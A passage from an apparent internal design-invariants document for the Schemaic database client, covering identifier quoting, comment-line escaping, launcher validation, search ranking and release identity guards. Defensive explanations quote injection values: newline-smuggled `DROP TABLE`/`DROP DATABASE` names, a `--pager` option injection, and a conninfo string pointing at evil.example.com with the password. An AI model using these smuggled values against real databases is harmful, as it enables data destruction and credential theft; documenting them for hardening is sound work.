  have an escape**, so it emits them: `ident_sql` writes `[name]` with a `]` doubled, and
  `qualified_table` names `schema.table`, never the database, since a two-part name there is
  schema-first — so an export can be retargeted. A statement that names **one row by key** must
  not be, and takes `export::qualified_row_target` instead, three-part on SQL Server and
  `qualified_table` elsewhere: the write-back (`qname3`) and the grid's copies of it. Its literals double only the quote and are **`N`-prefixed** — an unprefixed one is
  `varchar`, converted to the database's code page on the way in, so `'Ωμέγα'` can arrive as
  `'?????'` (`a_sql_server_string_literal_is_national_and_doubles_only_the_quote`). That is the
  literal's half only: `N'…'` carries the text as far as the column, and a `varchar` column still
  converts it to its own code page, with the same `?` — which `db::mssql`'s `code_page_check`
  refuses before the write (see there).
  **The other half of a *conditional* quoter is which predicate the condition asks**, and that is
  the same bug by a second route: `ident_if_needed` and `filter::needs_quoting` ask
  `intel::must_quote_ident` (can this be a bare **identifier**), never `intel::is_reserved_word`
  (can this be a bare **alias**) — a diagnostic's question, answered by a deliberately laxer list.
  They asked the alias set, and on SQLite `CAST`, `IF` and `RAISE` sit in the gap, so a table named
  for one of them produced an `ORDER BY` that would not parse. Right quoter, wrong question. See
  `core::intel` for the measurement and the test that holds both lists to the engine itself.
  **A third question earned a third function, and that is not a fifth quoter.**
  `export::ident_pattern_sql` is for the one position the server reads as a **`LIKE` pattern**
  rather than as a name: MySQL's and MariaDB's `GRANT … ON db.*`. Quoting answers *where does the
  name end*, never *how will the server read what is inside it*, and a backtick does not suppress
  the pattern there — the manual's own escaped example is itself backticked. ``GRANT SELECT ON
  `app_db`.* TO …`` therefore also granted on `appXdb`: measured on MariaDB 10.11.14 and MySQL
  8.4.11, where an account granted on `sc_rev_a_b` read rows out of `sc_rev_aXb`, with `SHOW GRANTS`
  printing the stored pattern back unescaped so nothing afterwards showed it. It escapes `\` first
  (it is the pattern's own escape character, so a database really named `a\_b` would otherwise come
  out naming the pattern for `a_b`), then `_` and `%`, then quotes; `users::GrantLevel::object_sql`
  calls it from the MySQL `Database` arm **only**, because the table level is exact-matched. The
  family is three because there are three questions, not because quoters may be added freely — a
  fourth needs a fourth question, and *don't write a fifth* is unchanged. **The cost is named**: a
  grant some other client wrote unescaped is stored under the pattern `app_db`, and a revoke emitted
  from here now names `app\_db`, so the server answers ERROR 1141 instead of removing it — which
  includes the grants Schemaic itself wrote before this existed.
  **What no quoter here answers is whether text is safe on a *comment* line** — a separate question
  with its own function and its own rule, next.
- **Nothing server-supplied reaches a comment line unescaped**, and that is a different guarantee
  from quoting: `export::comment_text` answers it and `export::ident_sql` does not. A `--` comment
  ends at the first physical newline and an identifier may *contain* one — PostgreSQL 16.15 creates
  a table whose name is the two lines `orders` and `DROP TABLE customers;` and hands it back from
  `information_schema.tables` without complaint, verified live — so a dump's per-table header
  emitted `-- orders` and then `DROP TABLE customers;` as a **top-level statement** in a file the
  user takes for their backup. It executes at *restore*, through Schemaic's own script runner or
  `psql` or any other client, against whichever database the restore targets, which is typically
  their own and not the hostile one the name came from; and a payload quieter than a `DROP` (a
  `CREATE ROLE … SUPERUSER`, an added trigger) survives a read of the restore's output entirely.
  **Everything executable in the file was already correct** — `create_container_sql`,
  `target_database_sql`, `sequence_resync_sql` and `export_inserts_chunks` route identifiers through
  `ident_sql`/`ddl_string` and every cell through `sql_literal` — so the gap was exactly the
  human-readable lines, and the quoter rule above did not cover it. `export.rs`'s
  `-- NOTE: binary column…` line is the proof: it *did* call `ident_sql` and was vulnerable anyway,
  because doubling a backtick or a double quote says nothing about `\n`. Five sites route through
  the escaper now — the `-- Schemaic dump of {database}` header, the server-assigned-columns note,
  the "ticked but not found" note, the per-table `-- {name}` line (the site an attacker controls
  most cheaply) and that binary-column note. It replaces `\n` and `\r` with a space — a lone `\r` is
  a line terminator to enough tools to count — and rewrites `*/` as `* /` so the same text is safe
  inside a block comment a future header might use, and it collapses rather than drops so the result
  still reads as the name it came from. It lives beside the quoters so the grep the rule above relies
  on finds it too. `skeleton.rs` holds a **second, private escaper of the same name** for the
  `/* … */` drafts — it maps every control character to a space and breaks `*/` the same way, so it
  is safe on a `--` line as well; the two have not been unified, and new code calls the public one.
  Extend `dump::tests::a_newline_in_a_name_cannot_open_a_line_of_its_own` rather than the escaper's
  own test: it asserts over the whole emitted plan that no line inside a step which *starts* as a
  comment stops being one, because `comment_text_closes_every_way_out_of_a_comment` passes against
  the unfixed tree — nothing there having called the escaper.
  **`core/schema.rs` carries a second family of such lines, and it closed one member late.** Where
  an engine has no statement for an object, that module says so in a comment instead — a sequence
  `TableInfo::create_ddl` cannot restate, and the trigger arms whose action the target engine cannot
  express — and `TriggerInfo::create_sql`'s **PostgreSQL `Body`** arm was the fifth member,
  interpolating `self.name` and the qualified table with no treatment at all, under a commit message
  that enumerated four and fixed four. A trigger named `t1` + newline + `DROP DATABASE prod; --`
  turns the second line of that note into a top-level statement in whatever script carries it, and
  `Db::run_script`'s guard deliberately never reads the file. Both values go through `comment_text`
  now, on the same rule as the three arms beside them.
- **A string handed to a process launcher is validated in `core::launch`, at the boundary where it
  stops being data.** Two Criticals in one review turned out to be one absent habit: nothing in this
  codebase validated a string at the point where the app stopped *displaying* it and the operating
  system started *executing* it. A URL the terminal panel had merely printed reached `cmd /C start`
  with its `&` unquoted (Rust's Windows encoder quotes only an empty argument or one holding a space
  or a tab), so one click on a link ran a command; and a **server-supplied** database name reached
  the DB client's argv from the schema tree's "Open in CLI", where MySQL read
  `--pager=touch /tmp/PWN` as an option and libpq read `dbname=postgres host=evil.example.com` as a
  whole conninfo string and dialled the attacker's host with `PGPASSWORD` in hand. Both are written
  up with their measurements under `core::launch`. The rule has two halves. The validation lives at
  the **launcher**, not at the producer — a producer may have its own good reasons to be permissive,
  and the terminal's link tagger admitting `&` for a query string is one — and **no shell of this
  app's making is ever in between**, which is why the URI sub-delims that happen to be shell syntax
  are kept rather than filtered. `launch::tests::no_shell_ever_reads_a_url` enforces that second half
  by asserting the *composition* rather than the predicate: a hostile URL is either refused or
  reaches a program that is not a shell as exactly one argv element, so it stays red for any future
  launcher that reintroduces a shell however well the gate filters. **That half has one named
  exception, and it is named rather than assumed away**: `url_open_argv`'s Linux arm is `xdg-open`,
  which `xdg-utils` ships as a `#!/bin/sh` script, so on Linux the one program this module names is
  itself an interpreter. What it costs is stated in `launch.rs`'s rule 1 — the sub-delims
  `is_url_byte` admits reach that script's own parsing, and the argument that they are inert there is
  an argument about somebody else's code that nothing in this repository re-checks when `xdg-utils`
  changes; it was **not** verified against a real `xdg-open`, there being none on the machine, and
  the note says so. What still holds is what this module can guarantee alone: one argv element, RFC
  3986's allowlist, no byte outside it. The denylist of nine shell *names* could say nothing about a
  program that is not one of them, which is exactly how this passed for as long as it did, so the
  gate now also asserts the launcher is in a `LAUNCHERS` allowlist declaring `(program,
  is_an_interpreter)` for each of the three, and `a_launcher_that_is_an_interpreter_is_declared`
  fails if a second interpreter is added without amending that paragraph. **A refusal is a `Result`, not a caller's
  `if`** — `mysql_shell`/`psql_shell` and their `_config` halves return a `Result` where they
  returned an `Option` or a bare config (a `launch::Refusal` from a `_config` half, which the
  `*_shell` calling it words through `refusal_text`; `String` from the `*_shell`s and
  `mssql_shell_config`, whose no-client and WSL-sign-in lines come from the catalogue), so every
  refusal lands on the one arm `open_db_cli` already had for "no client found" (a message spawned in
  the terminal panel, and no engine badge) and none of them can be forgotten at a call site. Don't
  add a second gate in a caller, and don't spell one of these decisions inline: `open_url` spawns
  whatever `launch::url_open_argv` hands it and decides nothing itself. **`tunnelled_verify_blocker`
  was the refusal that lived only in a caller's `if`**, and it is asked inside
  `mysql_shell_config`, `psql_shell_config` and `mssql_shell_config` now — beside
  `wsl_tls_blocker` in the first two; `sqlcmd` is handed no certificate path, so the third has none
  to ask. `open_db_cli` still
  asks it earlier, where the endpoint is rewritten, so a verifying tunnelled connection is told why
  before it is told the tunnel is down — but the builder is the authority, because a second launch
  path would compile with the check absent.
  `both_cli_builders_refuse_a_tunnelled_verifying_connection_themselves` reads all three builders'
  spans for it — the name is from when there were two.
- **Every schema-search surface matches through one predicate.** The schema tree's filter box and
  the Find-Anywhere palette answer the same question over the same `DbSchema`, so they go through
  `schema::TableInfo::matches_search` (name or any column) and `schema::ObjectItem::matches_search`
  (name only — a `detail()` match would surface a sequence because some unrelated table's name
  appeared in its owner). They were two predicates and the palette's simply **had no object arm**,
  so on a PostgreSQL connection Ctrl+P for a type you were looking at in the sidebar returned
  nothing. **The name-versus-term rule underneath all of them is `schema::object_name_matches`** —
  the ER diagram's find bar (`erd::search`) is the third surface and the MCP server's
  `search_objects` (`cli::mcp::format_search_hits`, the one a model asks) the fourth, each a
  *caller* rather than another spelling, and `TableInfo::matches_search`/`any_column_matches` were
  folded onto it rather than each keeping its own `to_lowercase().contains`. The empty needle is why
  that matters beyond tidiness: the predicate owns the rule that an empty term matches nothing (every caller answers "no
  filter" separately), and while the callers spelled the comparison themselves that case was handled
  in some of them and not others. **`schema::name_survives` is the second empty-input rule, and the
  two are deliberately not interchangeable**: an empty *needle* matches nothing, an empty *filter*
  keeps every row. A search asks "does this name match what I typed", and nothing matches nothing;
  the schema tree's filter box asks "does this row survive", and with the box empty every row does.
  It exists so the tree can stop hand-spelling `filt.is_empty() ||
  name.to_lowercase().contains(filt)`, which it did at eight sites — the database and namespace
  rows, in the rendered tree and again in the keyboard walk that has to stay bug-for-bug identical
  to it — and it is a *second* spelling rather than a clause folded into `object_name_matches`,
  because folding it in there would have inverted every search on an empty term.
  **The predicate's body is no longer `name.to_lowercase().contains(needle)`.** That allocated one
  `String` per name asked, and the palette is deliberately undebounced, so a term that has not
  narrowed to anything yet (`custz` on the way to `customers`) walked every table name and every
  column name of every loaded database, allocating and freeing one for each — and the early exits do
  not help on that input, since nothing fills a bucket and nothing breaks out. Measured in release
  on a synthetic schema with a needle matching nothing (the worst case, and the one that happens
  while you are still typing): 0.66 ms per database at 500 tables × 25 columns, 1.57 ms at 1000 ×
  30, so ten middling databases were ~6.6 ms on the UI thread per character. There is now an
  allocation-free byte walk, taken only when **both** sides are ASCII, and the `to_lowercase`
  fallback is *kept* rather than replaced — `to_lowercase` is not `to_ascii_lowercase`, `İ`
  lowercases to two chars and `ẞ` to `ß`, so a byte-wise walk would answer differently for exactly
  the names `ghost_suffix` was written for.
  `the_allocation_free_path_agrees_with_lowercasing_the_name` is what pins the two together, and it
  is the assertion that matters: the fast path is an optimisation whose only failure mode is a
  quietly different answer. **Find-Anywhere's three passes were the last two copies**, and
  they were one function asking one question three times and answering it two ways: pass 2 went
  through the predicate while passes 1 and 3 hand-spelled `name.to_lowercase().contains(q)`, so a
  clause added to it — the predicate's own hypotheticals are quote-stripping and
  underscore/camel splitting — would have moved the tree and the object pass and left the name and
  column passes behind, leaving the palette disagreeing with the tree *and with itself*. Nothing
  fails for that today, which is why the pin is a **source gate**
  (`find_anywhere_matches_through_the_one_predicate`) rather than a behavioural test, and why it is
  scoped to `schema_hits` and not to `find_matches`: the passes live in the former, and a gate
  pointed at the latter scans forty lines of delegation and reports success — which is how it was
  first written, and what mutating the fix caught. Pass 1 asks `object_name_matches` **and not
  `TableInfo::matches_search`**, though that is the wrapper that looks right: the wrapper is name
  *or any column*, which is the *tree's* question, and folding it in here would list a table for a
  needle its name does not contain, duplicate what pass 3 already reports per column, and crowd out
  the object pass. `overlays::schema_hits` is the palette's half split out as plain data for exactly
  this reason, and `overlays::find_tests` asserts the two surfaces return the same objects for a set
  of terms. **One deliberate divergence — one gate, `is_editable_object`, and no other allowed without a test change:** an
  *internal* object (an identity column's counter) is listed by the tree and withheld by the
  palette — a tree row is context, sitting under the table that owns it, while a palette row is a
  destination, and this one's activation is an editor that refuses to open. That withholding is
  `overlays::is_palette_target`, which **delegates to `object_editor::is_editable_object`** rather
  than re-spelling it, and **both** producers ask it — the live search (its object pass, and the
  body tier's routines and events in `body_matches_across`) *and* `lookup_object` on the
  search-history path. A `serial`'s sequence is an ordinary object and a legitimate result, so it
  can be remembered; migrating its column to an identity column makes that same sequence internal,
  and only the second gate stops the remembered row from opening an editor the server would refuse.
  The same gate withheld SQL Server's sequences, synonyms, alias types and XML schema collections
  for as long as they had no form — `is_editable_object` answered no for `ObjectItem::tsql()` — so
  the tree's filter found them and the palette did not, through the one delegation rather than a
  second exclusion; and when the form landed, removing that one term ended the divergence on
  both producers at once, the remembered row included. **A PostgreSQL extension is withheld the
  same way and for the same reason, and is the third standing case** (the second is a routine
  `RoutineInfo::is_editable` refuses, such as a `LANGUAGE c` one whose body is a link symbol). An
  extension has no form (it is
  created from its picker and dropped from its row), so `is_editable_object` answers no for
  `ObjectItem::extension()` and the palette leaves it out while the tree's filter finds it. It is
  the same gate, not a second exclusion; give extensions a palette destination and the one term
  goes. Every path to `open_for_object` is gated (the tree's two, and this one) — don't add an ungated one.
  **The palette's body tier (`core::body_search`) is neither a fifth caller nor an exception.** It
  asks whether an object's *definition* contains the term, not whether its name does, so it does
  not go through `object_name_matches` for its match and this rule does not reach it; the one
  thing it asks the predicate is whether a name tier already lists the object, so as to skip it.
  A clause added to the predicate therefore moves which objects the body tier *skips*, never what
  counts as a body hit. The two text tiers below the snippets — open tabs and query history — read
  no `DbSchema` at all, so the rule does not reach them either.
- **A Find-Anywhere database is searched in three passes: table/view *names*, then objects, then
  columns** (`overlays::schema_hits`), and the object pass sits in the middle **deliberately**.
  Columns are the category that floods — one `user_id` foreign key across a hundred tables is a
  hundred hits — so with the objects appended last they were pushed past the 80-result cap
  entirely, and a type could not be found however precisely you typed its name. That is the same
  symptom the object arm was added to fix, arriving by a different route, which is why
  `an_object_survives_a_flood_of_column_matches` pins it with a deliberately small cap. Names are
  few, so the ordering costs only the tail of a broad column search.
  **Ordering alone was not enough, and `overlays::pass_shares` is what replaced it.** Ordering
  decided which category could crowd the others out and did so in *both* directions: objects last,
  and one `user_id` across a hundred tables pushed every type past the cap; objects ahead of the
  columns, and a serial-heavy PostgreSQL schema answered `id` with eighty `*_id_seq` rows and no
  table or column at all (`a_flood_of_sequences_does_not_crowd_out_tables_and_columns`). Neither is
  a *wrong* result — each is an absent one, for something the user typed precisely. So each pass is
  guaranteed `room / 3` if it can use it, a pass that cannot hands its share straight on, and the
  spare goes in pass order — names, objects, columns — so a narrow search still fills the list with
  the most precise matches first and only a search broad enough to overflow ever pays the share
  (`each_pass_gets_a_share_and_the_spare_goes_in_order`).
  **The same share is now applied a second time, across *databases*, which is why `pass_shares`
  takes a slice rather than `[usize; 3]`.** The cap used to be spent first-come by database:
  `find_matches` walked `db_nodes` in order and returned at the first one to fill the list, so on a
  connection holding `analytics` (400 tables, many carrying `order`) and `shop` (20 tables, one of
  them literally named `orders`), typing `orders` returned eighty rows of `analytics` and
  **`shop.orders` was not in the list at all** — an exact match on the term typed in full,
  unreachable by typing more, since a longer prefix cannot narrow `analytics` faster than it narrows
  `shop`. Hiding `analytics` was the only way to see it. `overlays::matches_across` is the merge:
  the early return is gone, every visible database is asked for at most `limit` hits of its own, and
  the buckets are combined by the same share. The extra work is bounded because `schema_hits` still
  stops each of its passes at the room it was given, so a database contributes at most `limit`
  however large it is. Three tests hold the shape — `a_later_databases_exact_match_is_not_crowded_out`,
  `one_database_still_fills_the_list` (the share must not cap a lone database at a fraction of
  `limit`) and `the_share_holds_for_any_number_of_buckets`, the last because the bucket count is now
  however many databases are loaded rather than always three.
  **Bodies are a fourth tier, below all three — names → objects → columns → bodies — and outside
  their share.** `find_matches` returns two lists from the same visible, loaded databases, so a
  hidden database leaks no body hit: the 80-row merge above, and `overlays::body_matches_across`,
  which asks each database's `body_search::body_hits_where` for up to `BODY_HIT_CAP` (50) that
  `is_palette_target` accepts — a C-language function or a `verbatim` T-SQL routine is refused
  **inside** the search, before it counts: dropped afterwards, a legacy PostGIS install's C
  functions, whose link symbols match `geography`, spent the whole cap and left the user's own
  routine unlisted (`routines_that_cannot_be_opened_do_not_spend_the_body_cap`) — and merges the databases
  with `db_shares`, the name tiers' round-robin across databases, under that cap of its own. It is
  handed the query **as typed** while the name tiers get it lowercased — `overlays::FindNeedles`
  carries both (`a_body_is_found_by_a_capital_that_lowercases_wider_or_narrower`). The
  body rows are appended after the merged 80 and take none of their rows: `BodyFindHit` is its own
  type rather than a `FindTarget` arm because it is its own list: a body match is the least precise
  answer the palette has, so it never takes a share of the rows the name tiers fill.
  `overlays::body_result_item` **borrows each row whole** from the builder that already opens that
  kind of object — `search_result_item` for a view, `object_result_item` for a routine or event —
  so a body hit opens, and is recorded in the search history as, exactly what its name row would.
  A trigger has no row of its own anywhere in the palette, so its row opens, and is remembered as,
  the table it fires on, with the trigger's name as the primary line. The secondary line is
  `{db} · {kind} body · {snippet}` (`{db} · trigger on {table} · {snippet}` for a trigger), and the
  primary carries no match highlight, since the name there is precisely what did not match.
  **Snippets are a fifth category, appended after the body tier** (`overlays::snippet_items`), with the
  bookmark glyph the panel toggle wears — in the **accent**, the only row colour in the list, because
  a snippet is the one result that is the user's rather than the server's (the completion popup tints
  its snippet rows for the same reason). They
  sit outside that cap because they come from `snippets.json` rather than from the schema passes:
  the palette is a way to reach the database, and a saved query is a thing you wrote *about* it.
  Activating one inserts it at the caret, as its library row does — and it is **not recorded in the
  search history**, which is what lets it be here at all: a `SearchEntry` resolves against the live
  catalogue, and a snippet is not a catalogue object, so remembering one would mean teaching the
  persisted `ObjectTag` about a thing no schema can confirm (and `snippet::next_id` reuses a
  deleted id, so a remembered one could later name a different query).
  **Open tabs are the sixth category and query history the seventh, appended in that order after
  the snippets** (`overlays::text_tiers`, chaining `tab_items` then `history_items`). Both take the
  body tier's as-typed needle (`FindNeedles::body`, trimmed), both are the **active connection's
  only**, and both drop a hidden database through `schema::db_visible` — a tab or an entry with no
  database is kept. What they search arrives as `overlays::TextSearch { tabs, active, history,
  open_history }`, built in `find_overlay` from `ui.tabs_ui` and from `ui.history` and
  `history_actions.open`, and passed as `build_items`' last parameter. `tab_items` lists the tabs
  whose text holds the term (`body_search::TextScan`, capped at `TAB_HIT_CAP` and bounded by
  `TAB_SCAN_BUDGET`; why it needs a budget the body tier does not is under `body_search.rs`), each
  tab's text **borrowed through `with_untracked`, never cloned**, since a tab may hold megabytes.
  Its row is `Tab::title()` over `open tab · {snippet}`, with no highlight on the title — the body
  tier's rule, since the title is not what matched; activating it re-checks the tab still
  exists (it may have closed since the row was built), switches to it with `crate::activate` and
  sets `Tab::jump_offset` to the match — the request *Go to Line* and *Go to Statement* use, which
  the editor pane's effect consumes, and which an effect runs on creation too, so a request set
  before the pane mounts is not lost. `history_items` lists `history::palette_hits` (capped at
  `PALETTE_HISTORY_CAP`), its primary the matching line by `body_snippet` — or the first 60
  characters of `history::preview` where the match is the panel's alone, across a line break the
  preview collapses or on the database or tab name, which `body_snippet` cannot find — over
  `history · {relative_time} · {db}`. Those secondary words — *snippet*, *open tab*, *history*,
  *view body*, *{kind} body*, *trigger on {table}* — are the catalogue's (`palette-row-*`), and so
  is the `{kind}` inside them and on an object row's `{database} · {kind}` line
  (`i18n::object_kind`), and so is the age, through `i18n::relative_time`.
  **Activating a history row opens the statement in a new tab through
  `HistoryActions::open`, exactly as the panel's row does, and does not run it**, so neither tier
  goes anywhere near the write guard. Both glyphs are `text_muted` — `icons::FILE` for a tab and
  `icons::CLOCK` for history, deliberately not the rotating clock, which marks the empty query's
  recent searches — because the accent is the snippet's alone, and two accented kinds would mean
  neither. Neither tier is recorded in the search history, for the snippets' reason: a tab or a
  past statement is no catalogue object for a `SearchEntry` to resolve against.
- **The Find-Anywhere query is not debounced.** Unlike the schema tree's filter box
  (`debounced(filter_input, SEARCH_DEBOUNCE_MS)`), the palette's effect re-runs on every keystroke,
  over every loaded database. So anything it calls per-database is on a per-character path: that is
  why the object arm goes through `DbSchema::objects_matching` (clones only the hits) rather than
  `objects_all` (clones the database's every enum, domain and sequence, an enum's whole value list
  included, to answer a substring test). Same rule as `SignalGet::with` over `get`. The body tier is
  on the same path and is the widest scan on it — every view, trigger, routine and event body of
  every loaded database — which is why it searches a copy of the bodies folded once per schema
  (`body_search::BodyIndex`) rather than folding per keystroke, `body_search::searches_bodies`
  holds it back until the term has three characters, and `body_hits_where` stops at the cap it is
  given. The open-tab tier is on it too, and has no index to search — hence its byte budget
  (`body_search::TAB_SCAN_BUDGET`). **Neither text tier is tracked by the effect**: tab text and
  history are read untracked, since tracking them would re-run the whole palette on every
  keystroke in an editor behind it. The cost is that an open list does not notice a tab edited or
  a statement run while it is up; the next keystroke in the palette catches up.
- **Identifier scanning treats bytes `>= 0x80` as word bytes** so Unicode identifiers tokenize whole.
  `sql::is_word_byte` (continues a word) and `sql::is_word_start` (begins one — `alphabetic`, since a
  digit can't start a name) are the **only** definitions, next to `skip_noncode` because they answer
  the other half of the same question: that one says where a token can't start, these say how far it
  runs. Don't inline the predicate at a new scanner — there were four copies of each, no test
  comparing them, and the rule had already been regressed and repaired once. `sql.rs` tests both over
  all 256 byte values and asserts they differ on exactly the digits.
  **Those three tests asked the two predicates and nothing that uses them, and four live violations
  were sitting behind them** — three inside `core/sql.rs` itself and one in `ui/sql_highlight.rs`,
  each a hand-rolled ASCII word scan. The one that mattered is `has_top_level_where`, *the
  missing-`WHERE` safety net*: with the ASCII spelling a byte `>= 0x80` **ended** a word, so the
  ASCII tail of a non-ASCII identifier was scanned as a word of its own and `DELETE FROM éwhere`
  answered "this statement has a WHERE" — `unsafe_reason` then returned `None`, `run_verdict` never
  reached its `Confirm` arm, and with `confirm_writes` off the delete ran unasked. utf8 identifiers
  are ordinary on MySQL and PostgreSQL, which is what this invariant is for. The other three lose no
  guard and are repaired anyway, because a wrong copy of the one definition is what the next scanner
  gets copied from: `leading_keyword_span` read `SELECTé 1`'s keyword as `SELECT` (a syntax error
  either way, but every `read_only_heads` comparison downstream would have matched it),
  `word_tokens` split `cafédelete` into two tokens so `contains_write` answered true for a `SELECT`
  (over-blocking, which is the correct direction for a refusal gate and still a wrong answer), and
  `sql_highlight::lex_line` stepped over each byte of a multi-byte character and lexed the ASCII
  tail as a fresh word, so `SELECT éselect FROM t` painted `select` as a keyword *inside* a legal
  column name — spans that reach the Ctrl+K diff through `highlight_spans` as well. It surfaced only
  where a keyword happened to follow the non-ASCII byte, which is why nobody saw it.
  **The tests now ask a *scanner*, which is the half that was missing**:
  `a_non_ascii_table_name_does_not_hide_a_missing_where` composes `has_top_level_where` with
  `unsafe_reason` over all three dialects (and asserts a real `WHERE` after a non-ASCII name is
  still found, so the fix cannot trade a missed guard for a spurious one), and
  `a_non_ascii_byte_does_not_end_a_word_for_the_other_two_scanners` covers the rest.
  **That sweep did not reach every scanner in the module it started in.** `sql::scan_dollar` scans a
  PostgreSQL dollar-quote tag, which PostgreSQL defines as *"the same rules as an unquoted
  identifier, except that it cannot contain a dollar sign"* — so it is a word scanner, and it was
  written ASCII-only. `$prüfung$` ended the tag at the `0xC3`, `scan_dollar` answered `None`, and the
  statement splitter then cut a PL/pgSQL body at its internal semicolons. It asks
  `is_word_byte`/`is_word_start` now, and the `is_word_start` half closes an over-read on the other
  side that the ASCII loop had too: `$1$` is two positional parameters, not a tag `1`. `e_prefixed`
  — the *"is this `'` PostgreSQL's `E'…'`"* test — moved to `is_word_byte` in the same commit. The
  lesson for the next sweep is that a violation does not have to look like a tokenizer: both of
  these are three lines inside a scan of something else, which is why grepping for the loops did not
  find them.
  **Where a name *ends* is per-dialect, and that is one definition too**: `sql::continues_name`,
  built on `is_word_byte` — every engine adds `$` (`continues_dollar_name`: MySQL's bare
  identifier is `[0-9a-zA-Z$_]`, SQLite's tokenizer continues one through it), T-SQL `#` and `@`
  besides — with `sql::t_sql_name_prefix` for the leading `@`/`@@`/`#`/`##` of a
  T-SQL variable, system function or temporary table, `0` unless `SqlDialect::prefixed_names()`.
  MySQL and SQLite were said to add nothing, so Format Code wrote a valid `a$b` back as the syntax
  error `a $ b` there (review finding R1-L2-03); and the guards' own word scanners, `word_tokens`
  (the read-only gate's deny-list and `contains_write`) and `tsql_statements`, stopped at `$` on
  every engine, so `SELECT a$delete FROM t` — one column — was refused as a `DELETE` by the gate,
  blocked on a read-only connection, and on SQL Server cut into `a$` | `delete FROM t` for a
  "DELETE without WHERE" confirm (R1-L2-04). Both walk with `continues_name` now. One cost of the
  wider word: a range closed by `DELIMITER $`'s terminator ends in the word `END$`, so
  `intel::is_probable_typo` refuses any word holding a `$` — no keyword does.
  Four scanners split a name where SQL Server does not: the read-only gate's `call_tokens` ended
  `dbo.f@GETDATE()` at the `@` and asked the allowlist about `GETDATE`, `sqlfmt::tokenize` cut
  `@x` from its `@`, so Format Code wrote back `@ x`, a batch that no longer compiled,
  `ddl::TsqlCursor`, the trigger and routine header walk, read a parameter `@as` as a `@` and the
  keyword `AS`, so a procedure declaring one rebuilt into Msg 137, and `db::mssql`'s view-header
  scan read `v$as` as `v` and the header's `AS` — it is on the cursor now, as
  `ddl::tsql_view_parts`. A fifth was the guards' `word_tokens`, which dropped the leading prefix
  and read the rest, so `SELECT @delete = 1` was refused as a `DELETE` and `SELECT * FROM #update`
  blocked on a read-only connection; it keeps the prefix on the word now (`@DELETE`, no keyword any
  list holds), and the keyword spelled without one is read as before
  (`a_t_sql_variable_spelled_like_a_keyword_is_no_write`). The editor's two word scanners in
  `pairs.rs` were the same defect again: `block_words` read `SET @end = 1` as the keyword `END`,
  so a `BEGIN` paired with a variable and a typed `END` found nothing to dedent to, and MySQL's
  `a$end` the same; `identifier_occurrences` boxed the column `id` with the caret on `@id` and
  split `a$b` at the `$` (R1-L2-01, R1-L2-02). Both read a name as prefix plus `continues_name`
  run now (`a_prefixed_or_dollar_name_is_no_block_word`,
  `occurrences_keep_a_sigil_or_dollar_as_part_of_the_name`), `block_words` cutting a name at a
  `DELIMITER`'s terminator as `sqlfmt::tokenize` does, so `END$$` is still an `END`. A new T-SQL
  scanner asks these two rather than adding the bytes locally.
- **A Velopack channel name is app identity, like `--packId`: add a name, never rename one.** The
  three `release.yml` packs with — `win-x64`, `linux-x64`, `osx-arm64` — are explicit because a
  *default* channel (`win`, `linux`) reaches only the manifest name, so both platforms emit one
  `Schemaic-<version>-full.nupkg`, and `GithubSource::download_release_entry` resolves a package by
  matching `FileName` across the release's assets: a Linux client following its own manifest can be
  handed the Windows build. Renaming one afterwards is the worse half, because an installed app asks
  for the channel baked into the manifest it was packed from — a rename orphans every install
  carrying the old name, silently, and there is no route back to those users to tell them. So a
  fourth platform gets a fourth name (`osx-x64` beside `osx-arm64`), never a widening of an existing
  one. **The guard is a CI step rather than a unit test**, which is this section's one standing
  exception to *test-enforced where possible*: no crate names a channel — `update.rs` passes `None`
  for the whole `UpdateOptions`, so not even `ExplicitChannel` mentions one — and `cargo test
  --workspace` therefore cannot see these strings at all. `release.yml`'s second step, right after
  `checkout` and ahead of the build so a bad name costs seconds instead of a compile, fails the job
  unless `matrix.channel` is one of the three. That catches the realistic mistake — a typo, or a
  rename of a shipped channel in the matrix — in seconds and in the same file as the mistake. It
  **cannot** catch someone editing the matrix and the step's allowlist together, and nothing inside
  the repository could: the guard pins the workflow to its own list, not to what has actually
  shipped on GitHub. The friction is the value — a rename has to be deliberate in two places, one of
  which is a comment explaining why it must not happen. Adding a platform is expected and safe: add
  the name in both places. See `app::update` for the packed file names this was measured against.
  **The tag and `[workspace.package] version` are a third identity pair, reconciled in the same
  file.** The version has two sources — the packages are *named* from the tag, and the binary inside
  them reports `Cargo.toml` — so tagging without the bump publishes `schemaic_$v_amd64.deb` and a
  Velopack manifest at `$v` around a binary whose `--version` says something else, and whose
  `apt-get install schemaic=$v` rollback target therefore names a version the app disagrees with.
  `vpk pack` already refuses a version *lower* than the channel's latest, so only this direction was
  silent. `release.yml`'s *Resolve the package version* step fails the job when `${GITHUB_REF_NAME#v}`
  and the `Cargo.toml` value disagree, and it sits beside the channel guard for the channel guard's
  stated reason: a bad identity value should cost seconds, not a compile.
  **`core::APP_ID` is another value of this class, and the one a unit test can guard, because a
  crate names it.** It is the Linux window's `app_id`/`WM_CLASS`, the desktop entry's file name and
  the macOS `--bundleId` at once, and a shell draws a window's icon by matching the first against
  the second, so renaming it orphans every entry already installed under the old name — the
  constant's own doc says as much — and, on Windows, the
  `HKCU\Software\Classes\AppUserModelId\<APP_ID>` key a desktop notification is registered under
  (`app::notify`), which the app would simply write afresh under the new name and leave the old
  one behind. `the_app_id_names_the_desktop_entry_and_matches_every_packager`
  pins it against `packaging/linux/<APP_ID>.desktop` and every packager's copy of the id, down to
  `release.yml`'s `--bundleId`; the list, and why the value exists, are under `app::update`.
  **The published package-repository identity is the same rule with a second instance**, and a more
  thinly guarded one. `https://fadion.github.io/schemaic/deb` and `/rpm`, `Origin: Schemaic`,
  `Suite: stable`, and the keyring path `/usr/share/keyrings/schemaic-archive-keyring.gpg` that
  `Signed-By` names are written into every user's source list by `install.sh`, and that machine
  keeps asking for them for as long as Schemaic is installed — so moving one stops updates for
  every existing install, silently, with no route back to those users, exactly as a channel rename
  does. `Origin`+`Suite` is additionally the string an unattended-upgrades user pins as
  `"Schemaic:stable"`. Three guards divide the work, all in `pages.yml` and all blocking the
  deploy. `verify-site.py`'s `check_client_config` pins the keyring path, `Suites: stable` and the
  `/deb` and `/rpm` segments against each *built site* — the artefact, after it exists. The host is
  parameterised through `SCHEMAIC_REPO_URL` precisely so a site can be built and installed from at
  `http://localhost:8000`, so it cannot be pinned there; it is pinned instead in the *source*, by
  the `Check the repository URL agrees everywhere` step, which compares `install.sh`'s `SITE`,
  `build-site.sh`'s default and the workflow's own `SCHEMAIC_REPO_URL` against one literal and
  fails if any drifts. That is the same shape as the channel guard and has the same limit: it
  catches one of the three moving, not a deliberate edit of all four. **That step now carries the
  other source-side identity values too**, the invariant having claimed guards for them that did not
